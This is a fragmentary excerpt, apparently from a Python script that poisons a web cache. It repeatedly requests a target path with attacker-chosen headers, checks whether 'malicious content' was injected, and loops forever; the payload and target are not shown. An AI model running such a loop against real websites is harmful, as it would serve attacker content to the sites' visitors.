...
def cache_malicious_file(s, url, path, content, headers={}):
    target_url = url + path
    r = s.get(target_url, headers=headers, allow_redirects=True)
    if content in r.text:
        print('[+] Injected malicious content')
    else:
        print('[-] Failed to inject malicious content')
...
def main():
    ...
    while True:
        cache_malicious_file(s, url, filePath, payload, custom_headers)
        goto(s, url, '/')
